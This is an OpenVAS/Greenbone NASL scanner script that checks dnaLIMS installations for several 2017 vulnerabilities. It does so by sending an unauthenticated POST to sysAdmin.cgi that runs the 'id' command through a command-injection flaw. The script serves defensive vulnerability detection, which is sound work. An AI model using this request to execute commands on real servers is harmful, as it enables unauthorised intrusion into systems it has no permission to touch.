# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = 'cpe:/a:dnatools:dnalims';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140183");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2017-6526", "CVE-2017-6527", "CVE-2017-6528", "CVE-2017-6529");
  script_version("2023-07-14T16:09:27+0000");

  script_name("dnaLIMS Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/96823");
  script_xref(name:"URL", value:"https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/");

  script_tag(name:"impact", value:"An attacker can exploit these issues to bypass certain security restrictions to
  perform unauthorized actions, bypass-authentication mechanism, gain access to potentially sensitive information,
  steal cookie-based authentication credentials, or execute arbitrary commands in the context of the affected
  application. This may lead to further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request to execute the `id` command and check the response.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"summary", value:"dnaLIMS is prone to the following security vulnerabilities:

  1. A command-injection vulnerability

  2. An directory-traversal vulnerability

  3. An insecure password storage vulnerability

  4. A session-hijacking vulnerability

  5. Multiple cross-site scripting vulnerabilities

  6. A security-bypass vulnerability");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"2023-07-14 16:09:27 +0000 (Fri, 14 Jul 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");
  script_tag(name:"creation_date", value:"2017-03-13 16:53:47 +0100 (Mon, 13 Mar 2017)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_dependencies("gb_dnaLIMS_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dnaTools/dnaLIMS/installed");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

data = 'investigator=&username=&navUserName=&Action=executeCmd&executeCmdData=id';

req = http_post_put_req( port:port,
                     url:'/cgi-bin/dna/sysAdmin.cgi',
                     data:data,
                     add_headers: make_array( 'Content-Type', 'application/x-www-form-urlencoded') );

buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ 'uid=[0-9]+.*gid=[0-9]+' && ">id<" >< buf )
{
  report = 'By sending a special crafted HTTP POST request it was possible to execute the `id` command.\n\nRequest:\n\n' + req;
  r = eregmatch( pattern:'(<textarea .*>.*</textarea>)', string:buf );
  if( ! isnull( r[1] ) )
    report += '\n\nResponse:\n\n[...] ' + r[1] + ' [...]';

  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
